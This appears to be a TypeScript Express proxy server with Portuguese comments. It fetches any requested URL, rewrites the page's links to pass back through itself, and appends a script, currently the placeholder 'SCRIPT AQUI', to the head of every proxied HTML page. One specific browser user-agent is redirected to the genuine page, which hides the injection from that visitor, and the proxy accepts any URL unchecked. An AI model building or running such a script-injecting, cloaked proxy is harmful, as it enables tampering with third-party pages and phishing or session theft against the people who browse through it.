import express from "express";
import morgan from "morgan";
import axios from "axios";
import mime from "mime";
import { setupCache } from "axios-cache-adapter";
import cheerio from "cheerio";
import useragent from "express-useragent";

const cache = setupCache({
    maxAge: 15 * 60 * 1000
});

const axiosReq = axios.create({
    adapter: cache.adapter
});

const script_injection = "SCRIPT AQUI";
const redir_useragent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36";

const app = express();
app.use(morgan('tiny'));
app.use(useragent.express());


const regex = /\s+(href|src)=['"](.*?)['"]/g;

function getMimeType( url: string ) {
    if( url.indexOf("?") !== -1 ) {
        url = url.split("?")[0];
    }

    if( mime.getType(url) === 'application/x-msdownload' ) return 'text/html';
    return mime.getType(url) || 'text/html';
};

app.get("/", (request, response) => {
    const { url } = request.query || "";

    console.log(request.useragent?.source!) //Descomentar se quiser ver o user agent da requisição

    if ( request.useragent?.source.toString() == redir_useragent.toString() ){
        return response.redirect(url?.toString()!);
    }

    if(!url) {
        response.type('text/html');
        return response.end("You need to specify <code>url</code> query parameter");
    }

    axiosReq.get(url.toString())
        .then((data) => {
            let html_code = data["data"];
            const url_mime = getMimeType(url.toString());
            if( url_mime === 'text/html' ) {
                html_code = html_code.toString().replace(regex, (match: string, p1: string, p2: string) => {
                    
                    let newUrl = '';

                    if( p2.indexOf('data:image') !== -1 ) {
                        return match;
                    }
                    
                    if( getMimeType(p2) !== 'text/html' ) {
                        return match;
                        console.log("MATCH: " + match);
                    }

                    if(p2.indexOf('http') !== -1) {
                        newUrl = p2;
                    } else if (p2.substr(0,2) === '//') {
                        newUrl = 'http:' + p2;
                    } else {
                        const searchURL = new URL(url.toString());
                        newUrl = searchURL.protocol + '//' + searchURL.host + "/" + p2;
                    }
                    return ` ${p1}="${request.protocol}://${request.hostname}:3000/?url=${newUrl}"`;                   

                });
                let $ = cheerio.load(html_code);
                $('head').append(script_injection);
                html_code = $.html();
            }
            response.type(url_mime);
            response.send(html_code);
        }).catch(error => {
            console.log("ERRO AQUI! => " + error);
            response.end("OK");
        });

});

app.listen(3000, () => {
    console.log("🚀 Server started on http://localhost:3000");
});
